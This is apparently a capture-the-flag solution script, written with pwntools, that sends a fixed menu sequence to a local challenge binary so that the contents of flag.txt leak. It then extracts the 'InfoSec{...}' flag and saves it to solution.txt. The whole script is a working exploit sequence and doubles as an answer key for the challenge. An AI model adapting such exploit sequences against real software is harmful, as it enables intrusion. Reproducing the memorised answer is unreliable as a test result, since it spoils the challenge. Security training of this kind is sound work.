#!/usr/bin/env python3
from pwn import *
import re
flag_regex = re.compile("(InfoSec{.+[^}]})")
flag = ""

p = process("./main.elf")
p.sendline("1")
p.sendline("1")
p.sendline("100")

p.sendline("3")
p.sendline("1")
p.sendline("flag.txt")

p.sendline("4")
p.sendline("1")

p.sendline("0")
p.sendline("1")
p.sendline("200")

p.sendline("2")
p.sendline("1")
p.sendline("200")

p.sendline("5")
p.sendline("1")

received = str(p.recvall(1).decode())
flag = re.findall(flag_regex, received)[0]

#Print the flag
print(flag)
#Write the flag to the solution file
solution = open("solution.txt", "w")
solution.write(flag)
solution.close()
